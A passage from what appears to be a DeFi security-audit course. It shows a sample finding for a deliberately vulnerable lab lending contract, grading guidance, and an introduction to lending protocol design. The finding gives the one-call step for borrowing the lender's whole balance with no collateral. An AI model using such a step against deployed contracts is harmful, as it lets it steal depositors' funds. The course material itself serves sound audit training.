             so the check never sees the amount being borrowed. An account with zero
             collateral and zero debt satisfies 0 <= 0.
Steps:       1. Call borrow(usd.balanceOf(lender)) from a fresh address.
Proof:       Lab1Test.test_B_borrowWithNoCollateral (passes on MiniLend, fails on FixAB).
Fix:         Increase debt first, then require healthy(msg.sender); revert otherwise.

What reviewers look for. A one-sentence summary a manager can read; the real root cause, not just the symptom; severity that follows the table in M1; a proof that runs; and a fix that is the smallest change that removes the false assumption. Avoid vague words ("could potentially").

DeliverableWrite four findings (A to D) in this format, with your own test code for at least two. Then list at least three of the "other issues" and give each a severity (probably Low or Informational).

Scorecard and next steps

How you didWhat it means
Found all four before any hint, with testsYou are ready for Lab 2. Add the subtle detail (why C needs cross-function re-entry).
Found two or three; needed level 1 or 2 hintsNormal. Reread the M1 tabs for the bugs you missed, and redo the four-pass reading on a different contract (for example the Uniswap V2 pair in Lab 9).
Found one or noneReturn to M1, do each bug's "How to spot it" table on this contract, then retry.

Next: Lab 2 applies the same method to Aave V3, a real protocol with the same bug classes in a larger design. If you prefer exchanges first, Lab 9 (Uniswap V2) is equally ready.

Stage 2: Lending on Ethereum

About 20 hours of study · needs: Stage 1

Theory in plain words

Lending in DeFi is over-collateralised: you borrow less value than you post, because the protocol cannot chase a borrower in court. If the collateral's price falls, a liquidation lets anyone repay part of the debt and take collateral at a discount. That discount is the incentive that keeps the system solvent. If prices move faster than liquidators act, or liquidation reverts, bad debt is left for depositors.

Interest is tracked with an index: one global number that grows with time. A user's debt is their recorded amount times today's index divided by the index when they borrowed. Everything depends on a price source (oracle). The four protocols differ in design choices you should be able to name: one big shared pool (Aave), one borrowable asset per market (Compound V3), fully isolated immutable markets (Morpho Blue), or a graph of vaults checked by a connector (Euler V2). Each choice moves risk from one place to another; none removes it.

Check yourself before moving on
